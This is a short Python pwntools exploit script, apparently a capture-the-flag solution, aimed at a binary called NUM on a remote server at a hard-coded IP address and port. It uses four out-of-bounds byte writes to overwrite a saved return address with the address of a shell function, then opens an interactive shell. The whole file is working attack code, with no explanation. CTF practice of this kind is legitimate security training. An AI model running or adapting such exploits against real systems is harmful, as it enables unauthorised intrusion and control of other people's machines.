from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

# p = process("./NUM")
p = remote("39.96.88.40",7030)
elf = ELF("./NUM")

p.recvuntil("?\n")
p.sendline(str(10))


p.recvuntil("NUM\n")
for i in range(10):
    sleep(0.2)
    p.sendline(str(i))

shell = 0x080491B2

# gdb.attach(p,"b *0x08049356")


p.recvuntil("?\n")
p.sendline(str('3'))
p.recvuntil("?\n")
p.sendline(str(112+4+16))
p.recvuntil(':\n')
p.sendline(str(0xb2))

p.recvuntil("?\n")
p.sendline(str('3'))
p.recvuntil("?\n")
p.sendline(str(113+4+16))
p.recvuntil(':\n')
p.sendline(str(0x91))

p.recvuntil("?\n")
p.sendline(str('3'))
p.recvuntil("?\n")
p.sendline(str(114+4+16))
p.recvuntil(':\n')
p.sendline(str(0x04))

p.recvuntil("?\n")
p.sendline(str('3'))
p.recvuntil("?\n")
p.sendline(str(115+4+16))
p.recvuntil(':\n')
p.sendline(str(0x08))

p.sendline(str(5))

p.interactive()